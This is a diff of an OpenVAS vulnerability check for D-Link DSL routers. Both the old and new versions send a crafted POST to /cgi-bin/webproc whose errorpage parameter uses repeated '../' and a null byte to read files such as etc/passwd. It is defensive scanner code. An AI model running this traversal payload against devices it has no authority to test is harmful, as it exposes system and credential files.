@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dlink_dsl_xss_n_path_trav_vuln.nasl 11022 2018-08-17 07:57:39Z cfischer $
+# $Id: gb_dlink_dsl_xss_n_path_trav_vuln.nasl 11208 2018-09-04 08:04:34Z cfischer $
 #
 # D-Link DSL Devices Directory Traversal And Cross Site Scripting Vulnerabilities
 #
@@ -24,24 +24,31 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = "cpe:/h:dlink:dsl-";
+CPE = "cpe:/h:dlink";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.813804");
-  script_version("$Revision: 11022 $");
+  script_version("$Revision: 11208 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-17 09:57:39 +0200 (Fri, 17 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 10:04:34 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2018-07-25 10:11:37 +0530 (Wed, 25 Jul 2018)");
-  script_tag(name:"qod_type", value:"remote_vul");
   script_name("D-Link DSL Devices Directory Traversal And Cross Site Scripting Vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
+  script_family("Web application abuses");
+  script_dependencies("gb_dlink_dsl_detect.nasl");
+  script_mandatory_keys("host_is_dlink_dsl");
+  script_require_ports("Services/www", 80);
 
-  script_tag(name:"summary", value:"The host is running D-Link DSL router
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/45084");
+
+  script_tag(name:"summary", value:"The host is a D-Link DSL router
   and is prone to path traversal and cross site scripting vulnerabilities.");
 
-  script_tag(name:"vuldetect", value:"Send the crafted http POST request
-  and check whether it is able to read passwords or not.");
+  script_tag(name:"vuldetect", value:"Send the crafted HTTP POST request
+  and check whether it is possible to read a file on the filesystem or not.");
 
   script_tag(name:"insight", value:"Multiple flaws are due to an insufficient
   validation for errorpage parameter.");
@@ -56,19 +63,11 @@ if(description)
   ME_1.08. Other models or versions might be also affected.");
 
   script_tag(name:"solution", value:"No known solution is available as of
-  25th July, 2018. Information regarding this issue will be updated once
+  04th September, 2018. Information regarding this issue will be updated once
   solution details are available.");
 
+  script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"NoneAvailable");
-
-  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/45084");
-
-  script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
-  script_family("Web application abuses");
-  script_dependencies("gb_dlink_dsl_detect.nasl");
-  script_mandatory_keys("host_is_dlink_dsl");
-  script_require_ports("Services/www", 80);
 
   exit(0);
 }
@@ -78,22 +77,22 @@ include("http_keepalive.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-if(!dlinkPort = get_app_port(cpe:CPE)){
-  exit(0);
-}
+if( ! port = get_app_port_from_cpe_prefix( cpe:CPE ) ) exit( 0 );
 
-data = "getpage=html%2Findex.html&errorpage=" + crap( data:"../", length:3 * 12 ) +
-       "etc/passwd%00&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin";
-
+files = traversal_files( "linux" );
 url = "/cgi-bin/webproc";
 
-req = http_post_req( port: dlinkPort, url: url, data: data);
-buf = http_keepalive_send_recv( port:dlinkPort, data:req, bodyonly:FALSE );
+foreach file( keys( files ) ) {
 
-if(buf =~ "HTTP/1.. 200 OK" && buf =~ "root:.*:0:[01]:")
-{
-  report = report_vuln_url(port:dlinkPort, url:url);
-  security_message(port:dlinkPort, data:report);
-  exit(0);
+  data = "getpage=html%2Findex.html&errorpage=" + crap( data:"../", length:3*12 ) + files[file] + "%00&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin";
+  req = http_post_req( port:port, url:url, data:data );
+  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+
+  if( buf =~ "^HTTP/1\.[01] 200" && egrep( string:buf, pattern:file, icase:TRUE ) ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
-exit(0);
+
+exit( 99 );
